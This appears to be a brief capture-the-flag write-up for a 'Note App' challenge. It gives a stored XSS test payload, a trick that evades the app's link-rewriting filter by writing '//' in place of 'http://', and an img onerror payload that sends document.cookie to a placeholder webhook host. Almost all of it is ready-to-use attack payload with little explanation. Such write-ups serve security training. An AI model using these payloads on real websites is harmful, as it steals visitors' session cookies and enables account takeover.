# Note App

Payload:
```html
<img src=x onerror=alert(1)>
```

Leak and steal cookie

Due to the `makeHyperLink` function, string with `http` or `www` will be modified and ruin the payload. Instead of using `http://`, just use `//`.
```html
<img src=x onerror=fetch('//YOURWEBHOOKURL/?'+document.cookie)>
```